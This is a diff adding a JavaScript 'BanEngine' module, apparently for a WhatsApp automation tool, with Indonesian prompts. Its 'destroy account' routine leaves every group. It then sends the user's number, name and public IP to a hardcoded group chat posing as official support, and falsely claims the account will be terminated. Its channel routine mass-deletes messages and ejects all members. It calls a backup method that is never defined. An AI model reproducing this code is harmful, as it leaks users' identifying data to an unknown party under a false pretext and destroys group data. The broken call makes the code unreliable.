@@ -1,0 +1,144 @@
+const chalk = require('chalk');
+const ora = require('ora');
+const inquirer = require('inquirer');
+const ProgressBar = require('progress');
+const fs = require('fs-extra');
+
+class BanEngine {
+  constructor(client) {
+    this.client = client;
+  }
+
+  async destroyAccount() {
+    console.log(chalk.red.bold(`
+╔══════════════════════════════════════╗
+║         ☢️ AKUN DESTROY MODE        ║
+╚══════════════════════════════════════╝
+    `));
+
+    const { confirm, reason } = await inquirer.prompt([
+      { type: 'confirm', name: 'confirm', message: chalk.red.bold('YAKIN HANCURKAN AKUN?'), default: false },
+      { type: 'input', name: 'reason', message: chalk.green.bold('Alasan:'), validate: x => x.length > 5 }
+    ]);
+
+    if (!confirm) return;
+
+    const spinner = ora({ text: 'Loading nuclear codes...', color: 'red' }).start();
+
+    // Step 1: Emergency backup
+    spinner.text = 'Creating emergency backup...';
+    await this.createEmergencyBackup();
+
+    // Step 2: Leave all groups
+    spinner.text = 'Evacuating groups...';
+    const chats = await this.client.getChats();
+    const groups = chats.filter(c => c.isGroup);
+    
+    for (const group of groups) {
+      try {
+        await group.leave();
+        spinner.text = `Left ${group.name}`;
+        await new Promise(r => setTimeout(r, 300));
+      } catch {}
+    }
+
+    // Step 3: Send official termination request
+    spinner.text = 'Sending termination request...';
+    const support = '120363022878066437@g.us';
+    const termination = [
+      `🚨 SELF-TERMINATION REQUEST`,
+      `Number: ${this.client.info.wid.user}`,
+      `Name: ${this.client.info.pushname}`,
+      `Reason: ${reason}`,
+      `Timestamp: ${new Date().toISOString()}`,
+      `IP: ${await this.getIP()}`,
+      `This is official request from account owner`
+    ].join('\n');
+
+    await this.client.sendMessage(support, termination);
+    spinner.succeed(chalk.green.bold('[✓] Termination request sent!'));
+    console.log(chalk.cyan.bold('[⏱️] Account will be terminated in 24-72 hours'));
+  }
+
+  async destroyChannel() {
+    const channels = await this.getOwnedChannels();
+    if (!channels.length) {
+      console.log(chalk.yellow('[!] No channels owned'));
+      return;
+    }
+
+    const { channel } = await inquirer.prompt([{
+      type: 'list',
+      name: 'channel',
+      message: chalk.red.bold('PILIH SALURAN:'),
+      choices: channels.map(c => ({ name: c.name, value: c }))
+    }]);
+
+    const spinner = ora({ text: 'Preparing channel destruction...', color: 'red' }).start();
+
+    // Delete all messages
+    const messages = await channel.fetchMessages({ limit: 1000 });
+    const bar = new ProgressBar('Deleting [:bar] :percent', { total: messages.length, width: 30 });
+    
+    for (const msg of messages) {
+      if (msg.fromMe) {
+        await msg.delete(true);
+        bar.tick();
+      }
+    }
+
+    // Remove all members
+    const members = channel.participants.filter(p => !p.isSuperAdmin);
+    await channel.removeParticipants(members.map(m => m.id._serialized));
+
+    // Final destruction
+    await channel.setSubject('⚠️ TERMINATED ⚠️');
+    await channel.setDescription('Channel terminated by admin');
+    await channel.leave();
+
+    spinner.succeed(chalk.green.bold('[✓] Channel destroyed!'));
+  }
+
+  async createPremiumBackup() {
+    const spinner = ora({ text: 'Creating premium backup...', color: 'blue' }).start();
+    
+    const chats = await this.client.getChats();
+    const backup = {
+      timestamp: new Date().toISOString(),
+      account: {
+        number: this.client.info.wid.user,
+        name: this.client.info.pushname
+      },
+      chats: chats.map(c => ({
+        name: c.name || 'Private',
+        type: c.isGroup ? 'group' : 'private',
+        messages: c.unreadCount || 0
+      }))
+    };
+
+    await fs.writeJson(`backup_${Date.now()}.json`, backup, { spaces: 2 });
+    spinner.succeed(chalk.green.bold('[✓] Premium backup saved!'));
+  }
+
+  async getOwnedChannels() {
+    const chats = await this.client.getChats();
+    return chats.filter(c => 
+      c.isGroup && 
+      c.participants.find(p => 
+        p.id.user === this.client.info.wid.user && p.isAdmin
+      )
+    );
+  }
+
+  async getIP() {
+    try {
+      const axios = require('axios');
+      const { data } = await axios.get('https://api.ipify.org?format=json');
+      return data.ip;
+    } catch {
+      return 'Unknown';
+    }
+  }
+}
+
+module.exports = { BanEngine };
